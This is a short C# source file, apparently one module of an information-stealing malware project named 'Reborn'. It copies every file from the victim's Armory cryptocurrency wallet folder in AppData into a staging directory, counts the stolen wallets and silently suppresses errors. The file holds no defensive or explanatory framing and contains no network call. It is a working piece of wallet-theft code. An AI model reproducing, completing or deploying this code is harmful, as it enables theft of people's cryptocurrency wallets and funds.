﻿using System;
using System.IO;

namespace Reborn
{
    class Armory
    {
        public static int count = 0;
        private static readonly string ArmoryDir = "\\Wallets\\Armory\\";
        public static void ArmoryStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ArmoryDir);
                    file.CopyTo(directorypath + ArmoryDir + file.Name);

                }
                count++;
                Counting.Wallets++;
            }
            catch{
                return; }

        }
    }
}
